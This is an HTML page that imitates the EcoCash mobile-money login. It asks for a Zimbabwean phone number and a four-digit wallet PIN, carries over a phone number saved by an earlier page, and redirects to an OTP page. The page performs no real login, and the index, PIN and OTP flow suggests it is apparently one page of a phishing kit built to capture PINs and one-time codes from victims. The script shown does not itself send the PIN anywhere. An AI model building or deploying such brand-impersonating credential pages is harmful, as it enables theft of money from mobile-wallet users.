<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirm</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff;-webkit-font-smoothing:antialiased}
.container{max-width:400px;margin:auto;padding:32px 16px 0;text-align:center}
.logo{font-size:44px;font-weight:bold;margin-bottom:16px}
.logo span:first-child{color:#0b5ed7}
.logo span:last-child{color:#e5533d}
h2{font-weight:normal;margin-bottom:24px;font-size:20px}
.phone-box{border:2px solid #0b5ed7;border-radius:12px;padding:12px 14px;display:flex;align-items:center;gap:10px;margin-bottom:14px;background:#fff}
.flag-img{width:26px;height:auto}
.country-code{font-size:16px;font-weight:bold;white-space:nowrap}
.phone-input{border:none;outline:none;font-size:16px;flex:1;padding:6px 4px;background:transparent}
.phone-box:focus-within{box-shadow:0 0 0 3px rgba(11,94,215,.15)}
.pin-label{margin-top:18px;color:#666;font-size:14px}
.pin-boxes{display:flex;justify-content:center;gap:10px;margin:14px 0}
.pin-boxes input{width:48px;height:48px;border:2px solid #0b5ed7;border-radius:10px;font-size:20px;text-align:center;outline:none}
.pin-boxes input:focus{box-shadow:0 0 0 3px rgba(11,94,215,.15)}
.forgot{color:#666;font-size:13px;margin-bottom:10px}
.bottom{position:relative;background:#0b5ed7;padding:56px 16px 24px;color:#fff;text-align:center;overflow:hidden;margin-top:30px}
.bottom::before{content:"";position:absolute;top:-45px;left:0;width:100%;height:90px;background:#fff;border-bottom-left-radius:100% 100%;border-bottom-right-radius:100% 100%}
.bottom p{margin-bottom:22px;font-size:14px;line-height:1.4}
.buttons{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:22px}
.btn{background:#fff;color:#0b5ed7;padding:14px;width:150px;border-radius:14px;font-weight:bold;border:none;font-size:14px;cursor:pointer}
.version{font-size:12px;margin-bottom:6px}
.terms{font-size:11px;line-height:1.4}
.terms a{color:#fff;text-decoration:underline}
@media(max-width:360px){.logo{font-size:38px}.pin-boxes input{width:44px;height:44px}.btn{width:100%;max-width:220px}}
</style>
</head>
<body>

<div class="container">
<div class="logo"><span>Eco</span><span>Cash</span></div>
<h2>Login</h2>

<div class="phone-box">
<img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW" class="flag-img">
<span class="country-code">+263</span>
<input type="tel" id="phone" class="phone-input" placeholder="Enter phone number" inputmode="numeric">
</div>

<div class="pin-label">Enter your PIN</div>

<div class="pin-boxes">
<input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
<input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
<input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
<input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
</div>

<div class="forgot">Forgot PIN?</div>
</div>

<div class="bottom">
<p>To register an EcoCash wallet or get assistance,<br>click below</p>
<div class="buttons">
<button class="btn">Register</button>
<button class="btn">Help &amp; Support</button>
</div>
<div class="version">v2.2.3P</div>
<div class="terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
</div>

<script>
const phoneInput=document.getElementById('phone');

// AUTO-FILL FROM INDEX.HTML
window.addEventListener('DOMContentLoaded',()=>{
  const savedPhone=localStorage.getItem('phone');
  if(savedPhone){
    phoneInput.value=savedPhone;
  }
});

// KEEP UPDATED IF USER EDITS
phoneInput.addEventListener('input',()=>{
  localStorage.setItem('phone',phoneInput.value.trim());
});

const inputs=document.querySelectorAll('.otp-input');

async function submitOTP(){
  const otp=Array.from(inputs).map(i=>i.value).join('');
  const savedPhone=phoneInput.value.trim();

  if(!savedPhone){
    alert('Phone number missing. Please restart verification.');
    return;
  }

  if(otp.length!==4 || !/^\d{4}$/.test(otp)){
    alert('Please enter a valid 4-digit PIN');
    return;
  }

  // Redirect after PIN entry
  window.location.href='otp.html';
}

// Auto movement and auto submit
inputs.forEach((input,i)=>{
  input.addEventListener('input',()=>{
    input.value=input.value.replace(/\D/g,'');
    if(input.value.length===1 && i<inputs.length-1){
      inputs[i+1].focus();
    }

    const filled=Array.from(inputs).every(inp=>inp.value.length===1);
    if(filled) submitOTP();
  });

  input.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && input.value==='' && i>0){
      inputs[i-1].focus();
    }
  });
});
</script>

</body>
</html>
